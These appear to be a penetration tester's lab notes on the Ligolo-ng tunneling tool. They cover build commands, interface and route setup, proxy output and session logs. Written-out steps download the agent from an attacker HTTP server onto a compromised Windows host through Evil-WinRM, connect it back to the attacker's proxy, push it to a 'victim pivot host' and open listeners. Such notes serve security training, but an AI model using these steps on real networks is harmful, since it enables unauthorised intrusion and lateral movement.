INIT

# Ligolo-ng
## Installation
``` 
git clone https://github.com/nicocha30/ligolo-ng
``` 
### Build the binary
#### Agent
``` 
go build -o agent cmd/agent/main.go
```
For Windows binary:
```
GOOS=windows go build -o agent.exe cmd/agent/main.go
```
#### Proxy
```
go build -o proxy cmd/proxy/main.go
``` 
For Windows binary:
```
GOOS=windows go build -o proxy.exe cmd/proxy/main.go
```
## Setup Ligolo Tunnel
### Setup `ligolo` interface
#### Interface 
```bash
sudo ip tuntap add user <username> mode tun ligolo
sudo ip link set ligolo u
```
#### Add route to interface (`ip route add`)
Add the internal route to the `ligolo` interface (create `ligolo` interface). The route should be to *the internal asset you don't have access to w/o the tunnel*
```bash
sudo ip route add 172.16.176.0/24 dev ligolo
```
### Get Ligolo Agent on box via winrm
```
iwr -uri 'http://192.168.45.176:8000/ligolo-agent-amd64.exe' -Outfile la.exe
```
### Execute Server/Proxy
```bash
┌──(root㉿kali)-[/home/trshpuppy/oscp/medtech]
└─# ligolo-proxy -selfcert
INFO[0000] Loading configuration file ligolo-ng.yaml
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC!
INFO[0000] Listening on 0.0.0.0:11601
    __    _             __
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /
        /____/                          /____/

  Made in France ♥            by @Nicocha30!
  Version: dev

ligolo-ng »
```
#### Need to get certificate fingerprint (w/ `--selfcert`)
```bash
ligolo-ng » certificate_fingerprint
INFO[0325] TLS Certificate fingerprint for ligolo is: 396A4A3F9BD38596D5395243D94BDA56496FD212B966958B64BA74946995470A 
ligolo-ng »  
```
### Execute Agent
On agent, need to execute w/ `-accept-fingerprint`
```powershell
*Evil-WinRM* PS C:\Users\Administrator\Downloads> .\la.exe -connect 192.168.45.176:11601 -accept-fingerprint 396A4A3F9BD38596D5395243D94BDA56496FD212B966958B64BA74946995470A
la.exe : time="2025-06-26T14:37:16-07:00" level=info msg="Connection established" addr="192.168.45.176:11601"
    + CategoryInfo          : NotSpecified: (time="2025-06-2...8.45.176:11601":String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError

```
### Start session with Ligolo repl
In the repl, type `session` and then once the session is applied, type `start`
```bash
INFO[0644] Agent joined.                                 id=005056868c4f name="WEB02\\Administrator@WEB02" remote="192.168.176.121:58142"
ligolo-ng » session
? Specify a session : 1 - WEB02\Administrator@WEB02 - 192.168.176.121:58142 - 005056868c4f
[Agent : WEB02\Administrator@WEB02] » start
INFO[1358] Starting tunnel to WEB02\Administrator@WEB02 (005056868c4f) 
[Agent : WEB02\Administrator@WEB02] »  
```
#### Check interface/ route in the repl (`iflist`)
```bash
[Agent : WEB02\Administrator@WEB02] » iflist
┌───────────────────────────────────────────────────────────────────────────┐
│ Interface list                                                                
├───┬──────────────┬───────────────────────────────────┬────────────────────┤
│ # │ TAP NAME     │ DST ROUTES                                 │ STATE         
├───┼──────────────┼────────────────────────────────────────────┼────────────
│ 0 │ ligolosample │ 10.254.0.0/24,10.255.0.0/24                │ Pending - 2 
│ 1 │ ligolo       │ 172.16.176.0/24,172.16.190.0/24,fe80::/64  │ Active - 3 
│ 2 │ tun0         │ 192.168.45.0/24,192.168.176.0/24,fe80::/64 │ Active - 3 
└───┴──────────────┴────────────────────────────────────────────┴───────────────
Interfaces and routes with "Pending" state will be created on tunnel start.
[Agent : WEB02\Administrator@WEB02] »  
```







### Setup 
```bash
sudo ip tuntap add user <username> mode tun ligolo
sudo ip link set ligolo up
```
#### Set up Proxy
```
./proxy -autocert
``` 
##### Another option 
Setup w/ self cert and use `-laddr` to bypass firewall (potentially)
```
./proxy -selfcert -laddr 0.0.0.0:443
``` 
### Send the agent to the victim pivot host 
```
scp ./agent <user>@<pivotIP>:/absolute/path
```
OR
``` 
./agent -connect <AttackIP>:11601
``` 
in the ligolo c2 
``` 
ligolo-ng >> session ? Specify a session : 1 - <usr>@<hostname> - XX.XX.XX.XX:38000
``` 
once specified, we can see their configuration 
``` 
[Agent : <usr>@<hostname>] >> ifconfig 
┌────────────────────────────────────┐ 
│ Interface 0 │ 
├──────────────┬─────────────────────┤ 
│ Name │ lo │ │ Hardware MAC │ │ │ MTU │ 65536 │ │ Flags │ up|loopback|running │ │ IPv4 Address │ 127.0.0.1/8 │ │ IPv6 Address │ ::1/128 │ └──────────────┴─────────────────────┘ 
```
in a new terminal 
```
sudo ip route add 192.168.0.0/24 dev ligolo
```
back in the ligolo c2 
```
[Agent : <usr>@<hostname>] >> start
```
your good to go 
```
ping 192.168.110.55
```
### Agent Binding/Listening
in the ligolo session use the `listener_add` command 
``` 
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp
```
```
nc -lvnp 4321
```
remove with 
```
listener_list listener_stop 0
```
## remove ligolo interface 
```
sudo ip link delete ligolo
```

> [!Resources]
> - [Ligolo-ng Docs](https://docs.ligolo.ng/)